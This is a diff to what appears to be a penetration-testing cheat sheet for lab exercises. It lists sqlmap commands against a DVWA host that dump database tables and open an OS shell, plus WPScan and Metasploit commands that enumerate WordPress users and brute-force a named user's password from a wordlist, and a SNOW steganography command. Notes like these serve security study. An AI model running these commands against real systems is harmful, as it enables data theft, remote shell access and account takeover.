@@ -27,3 +27,18 @@ Get list of tables -> sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&
 Dump data from tables -> sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -- cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql -T db --dump 
 Get OS shell -> sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/? id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --os-shell 
 {% content-ref url="../tools/sqlmap.md" %}sqlmap.md{% endcontent- ref %}
+
+WPSCAN Identify psw associated with the User ID "kusha" and resolve the issue to allow her to access her account again. 
+wpscan — url http://[IP Address]:8080/path — enumerate u (enumerate the usernames stored in the website’s database)
+wpscan --url http://192.168.1.10:8080/path -u kusha -P passwdlist.txt 
+or 
+msfconsole -q use auxiliary/scanner/http/wordpress_login_enum 
+show options 
+set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt 
+set RHOSTS <Target_IP> 
+set RPORT 8080 
+set TARGETURI http://10.10.10.10:8080/ 
+set USERNAME admin
+
+Snow 
+snow.exe -C -p "password" stegfile.txt
